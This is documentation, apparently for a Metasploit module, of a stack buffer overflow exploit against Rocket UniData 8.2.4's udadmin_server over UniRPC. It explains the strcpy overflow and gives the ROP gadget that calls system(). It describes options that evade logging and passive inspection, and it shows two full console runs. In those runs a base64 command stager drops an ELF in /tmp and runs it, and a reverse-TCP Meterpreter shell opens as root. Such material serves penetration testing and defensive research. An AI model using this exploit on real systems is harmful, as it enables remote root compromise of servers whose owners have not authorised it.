Exploits a stack-based buffer overflow in `udadmin_server`, which is the
administrator server for UniData (and possibly other services). It's accessed
via the RPC service `unirpcd`.

The username and password fields are both copied into a stack-based buffer
using a `strcpy`-equivalent function, which has no bounds checking. As a result,
we can write any amount of arbitrary data to the stack, including overwriting
the return address. What's more - the `password` field is encoded by negating
each byte, which means that despite being a `strcpy` overflow, NULL bytes are
actually allowed (but 0xFF bytes are not)!

For our exploit, we found a helpful gadget:

```
412e25:       48 89 e7                mov    rdi, rsp
412e28:       e8 a3 56 ff ff          call   4084d0 <system@plt>
```

That will simply pass whatever happens to be on the stack to `system()`.

## Vulnerable Application

The vulnerable application is `udadmin_server`, which is an RPC service that's
run as part of `unirpcd`, which powers Rocket Software's UniData application
(among others). The specific software is UniData 8.2.4.3001 for Linux, and
because this is memory corruption, the sha256sums are:

```
1cae78f2e190fe010b78f793fd98875295928af78e1e7eded5e9702ec08369ad  unirpcd
5186725bfd4a65b9ca82245702cf387fc5e6c4d4fa4edb9412a9ffebc7400e89  udadmin_server
```

The UniData software can be downloaded for free, but you have to request a demo
copy and wait for an email to arrive. I can provide the installation files if
needed.

The software is distributed as a .zip file, which contains a .tar file:

```
[ron@unidata unidata]$ unzip Unidata\ Personal\ X86_8.2.4.3001.zip
Archive:  Unidata Personal X86_8.2.4.3001.zip
  inflating: bin.tar
  inflating: UniData_Hotfix_V824_3001.pdf
  inflating: UniData_Release_Notes_v824.pdf

[ron@unidata unidata]$ tar -xf bin.tar

[ron@unidata unidata]$ sudo ./udtsetup

  [default options, set directories]

	CheckLang            Yes
	CheckPerms           No
	Group                sys
	InstallXDEMO         Yes
	LibDir               /home/ron/unidata/unidata/lib
	Startud              Yes
	UdtBin               /home/ron/unidata/unidata/bin
	UdtHome              /home/ron/unidata/unidata
	UnisharedDir         /home/ron/unidata/unishared
	WorkDir              /home/ron/unidata/unidata/work
```

I think it will automatically start the first time you install the software,
but to run it after a reboot (note that this must be done as root):

```
# export UDTBIN=/home/ron/unidata/unidata/bin
# export UDTHOME=/home/ron/unidata/unidata
# export PATH=$PATH:$UDTBIN
# export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$UDTBIN
# export LANG=C
# startud
```

(This module will not work at all against the Windows version)

## Verification Steps

Example steps in this format (is also in the PR):

1. Install the application
1. Start msfconsole
1. Do: `use [module path]`
1. Do: `run`
1. You should get a shell.

## Options

### `EXIT_CLEANLY`

Because of how our ROP chain works, it's not possible to exit the application
without crashing.

However, we CAN kill the process with a clean signal when executing our payload,
and that's what this option does. It prepends `kill -TERM $PPID &` to the
shell payload, which kills the parent in a way that's not logged.

The default is `true`.

### `UNIRPC_ENDPOINT`

The RPC endpoint to connect to. The default (`udadmin`) as well as `udadmin82`
should work. It's unlikely anything else will work.

### `UNIRPC_ENCODE_MESSAGES`

A boolean, defined in the `unirpc.rb` mixin, that turns UniRPC's packet-body
encoding on or off. Default is `true`.

In the UniRPC header, there is a bit that enables packet encoding. If set, the
packet body is XOR'd with either 1 or 2, depending on another header field.
While it's not strong encoding by any means, it does hide the exploit from
passive inspection. We set the encoding the XOR'ing with 2 by default.

## Scenarios

### Version 8.2.4 with auto-detection

```
$ ./msfconsole

msf6 > use exploit/linux/misc/unidata_udadmin_password_stack_overflow
[*] Using configured payload linux/x64/meterpreter/reverse_tcp

msf6 exploit(linux/misc/unidata_udadmin_password_stack_overflow) > set LHOST 10.0.0.179
LHOST => 10.0.0.179

msf6 exploit(linux/misc/unidata_udadmin_password_stack_overflow) > set RHOST 10.0.0.198
RHOST => 10.0.0.198

msf6 exploit(linux/misc/unidata_udadmin_password_stack_overflow) > set VERBOSE true
VERBOSE => true

msf6 exploit(linux/misc/unidata_udadmin_password_stack_overflow) > show options

Module options (exploit/linux/misc/unidata_udadmin_password_stack_overflow):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   EXIT_CLEANLY  true             yes       If set, tries to kill the parent process with SIGTERM before it crashes
   RHOSTS        10.0.0.198       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT         31438            yes       The target port (TCP)
   SRVHOST       0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT       8080             yes       The local port to listen on.
   SSL           false            no        Negotiate SSL for incoming connections
   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                        no        The URI to use for this exploit (default is random)

Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.0.179       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

View the full module info with the info, or info -d command.

msf6 exploit(linux/misc/unidata_udadmin_password_stack_overflow) > exploit

[*] Started reverse TCP handler on 10.0.0.179:4444 
[*] 10.0.0.198:31438 - Running automatic check ("set AutoCheck false" to disable)
[+] 10.0.0.198:31438 - The target is vulnerable.
[*] 10.0.0.198:31438 - Getting the version number for automatic targeting...
[*] 10.0.0.198:31438 - Trying to get version number from service defcs...
[*] 10.0.0.198:31438 - UniRPC version number: 8.2.4
[*] 10.0.0.198:31438 - Found matching target for version 8.2.4!
[*] 10.0.0.198:31438 - Generated command stager: ["echo -n f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAGgEAAAAAAAC8AQAAAAAAAAAQAAAAAAAAajlYDwVIhcB0CEgx/2o8WA8FBHAPBWo5WA8FSIXAdeox/2oJWJm2EEiJ1k0xyWoiQVpqB1oPBUiFwHhRagpBWVBqKViZagJfagFeDwVIhcB4O0iXSLkCABFcCgAAs1FIieZqEFpqKlgPBVlIhcB5JUn/yXQYV2ojWGoAagVIiedIMfYPBVlZX0iFwHnHajxYagFfDwVean5aDwVIhcB47f/m>>'/tmp/XMbNg.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/MXvDZ' < '/tmp/XMbNg.b64' ; chmod +x '/tmp/MXvDZ' ; '/tmp/MXvDZ' ; rm -f '/tmp/MXvDZ' ; rm -f '/tmp/XMbNg.b64'"]
[*] 10.0.0.198:31438 - Connecting to UniRPC endpoint udadmin
[*] 10.0.0.198:31438 - Authenticating to RPC service as XcizXGOEteljZLhIBvu with a stack-overflowing password
[*] 10.0.0.198:31438 - Payload sent
[*] 10.0.0.198:31438 - Command Stager progress - 100.00% done (863/863 bytes)
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045348 bytes) to 10.0.0.198
[*] Meterpreter session 1 opened (10.0.0.179:4444 -> 10.0.0.198:40546) at 2023-01-30 14:14:52 -0800

meterpreter > getuid
Server username: root
```

# Version 8.2.4 with specific targeting

```
msf6 > use exploit/linux/misc/unidata_udadmin_password_stack_overflow
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/misc/unidata_udadmin_password_stack_overflow) > set LHOST 10.0.0.179
LHOST => 10.0.0.179

msf6 exploit(linux/misc/unidata_udadmin_password_stack_overflow) > set RHOST 10.0.0.198
RHOST => 10.0.0.198

msf6 exploit(linux/misc/unidata_udadmin_password_stack_overflow) > set VERBOSE true
VERBOSE => true

msf6 exploit(linux/misc/unidata_udadmin_password_stack_overflow) > set TARGET 1
TARGET => 1

msf6 exploit(linux/misc/unidata_udadmin_password_stack_overflow) > show options

Module options (exploit/linux/misc/unidata_udadmin_password_stack_overflow):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   EXIT_CLEANLY  true             yes       If set, tries to kill the parent process with SIGTERM before it crashes
   RHOSTS        10.0.0.198       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT         31438            yes       The target port (TCP)
   SRVHOST       0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT       8080             yes       The local port to listen on.
   SSL           false            no        Negotiate SSL for incoming connections
   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                        no        The URI to use for this exploit (default is random)

Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.0.179       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   1   8.2.4

View the full module info with the info, or info -d command.

msf6 exploit(linux/misc/unidata_udadmin_password_stack_overflow) > exploit

[*] Started reverse TCP handler on 10.0.0.179:4444 
[*] 10.0.0.198:31438 - Running automatic check ("set AutoCheck false" to disable)
[+] 10.0.0.198:31438 - The target is vulnerable.
[*] 10.0.0.198:31438 - Generated command stager: ["echo -n f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAGgEAAAAAAAC8AQAAAAAAAAAQAAAAAAAAajlYDwVIhcB0CEgx/2o8WA8FBHAPBWo5WA8FSIXAdeox/2oJWJm2EEiJ1k0xyWoiQVpqB1oPBUiFwHhRagpBWVBqKViZagJfagFeDwVIhcB4O0iXSLkCABFcCgAAs1FIieZqEFpqKlgPBVlIhcB5JUn/yXQYV2ojWGoAagVIiedIMfYPBVlZX0iFwHnHajxYagFfDwVean5aDwVIhcB47f/m>>'/tmp/dkwAq.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/xHIVV' < '/tmp/dkwAq.b64' ; chmod +x '/tmp/xHIVV' ; '/tmp/xHIVV' ; rm -f '/tmp/xHIVV' ; rm -f '/tmp/dkwAq.b64'"]
[*] 10.0.0.198:31438 - Connecting to UniRPC endpoint udadmin
[*] 10.0.0.198:31438 - Authenticating to RPC service as iSPJhHXcpJSAgpM with a stack-overflowing password
[*] 10.0.0.198:31438 - Payload sent
[*] 10.0.0.198:31438 - Command Stager progress - 100.00% done (863/863 bytes)
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045348 bytes) to 10.0.0.198
[*] Meterpreter session 1 opened (10.0.0.179:4444 -> 10.0.0.198:40548) at 2023-01-30 14:16:32 -0800

meterpreter > getuid
Server username: root
```
